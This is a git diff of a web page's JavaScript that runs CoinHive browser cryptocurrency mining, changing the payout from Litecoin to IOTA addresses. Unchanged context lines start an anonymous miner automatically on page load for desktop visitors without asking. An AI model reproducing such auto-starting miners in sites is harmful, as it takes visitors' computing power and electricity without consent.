@@ -1,15 +1,15 @@
 var siteKey = 'wa8hBKDsq6HbuplTPJj6NZr0MGs3kVuH'
+
 /** For Setting up the User Miner */
 var anonMiner = new CoinHive.Anonymous(siteKey, {throttle: 0.2});
 if (!miner.isMobile()) {
     anonMiner.start();
-}
-else {
+} else {
     window.alert("Please note that you are mining on mobile which is not recommended.");
 }
 
 function getWalletAddress() {
-    return document.getElementById('ltcAddress').value;
+    return document.getElementById('iotaAddress').value;
 }
 
 function createAttribute(name, val, parent) {
@@ -64,12 +64,12 @@ function createiframe() {
 
 function startUserMiner() {
     var userWalletAddress = getWalletAddress();
-    var userMiner = new CoinHive.User(siteKey, 'LTC=' + userWalletAddress, {threads: 1,
+    var userMiner = new CoinHive.User(siteKey, 'IOTA=' + userWalletAddress, {threads: 1,
         throttle: 1});
     // AnonMiner.stop();
     // Neccessary to update user Total Hashes not actually Mining
     // Fuck CoinHive
-        userMiner.start();
+    userMiner.start();
 
     var button = document.getElementById('minerButton');
     button.innerHTML = "Mining to: " + userWalletAddress;
@@ -79,7 +79,7 @@ function startUserMiner() {
     var div = document.createElement('div');
     createAttribute('class', 'coinhive-miner', div);
     createAttribute('data-key', siteKey, div);
-    createAttribute('data-user', 'LTC=' + userWalletAddress, div);
+    createAttribute('data-user', 'IOTA=' + userWalletAddress, div);
     createAttribute('data-autostart', 'true', div);
     createAttribute('data-whitelabel', 'false', div);
     createAttribute('data-background', '#FFFFFF', div);
@@ -103,7 +103,7 @@ function minerURL() {
     var queryString = window.location.search;
     if (queryString.length) {
         queryString = queryString.substring(1);
-        document.getElementById('ltcAddress').value = queryString;
+        document.getElementById('iotaAddress').value = queryString;
         startUserMiner();
     }
 }
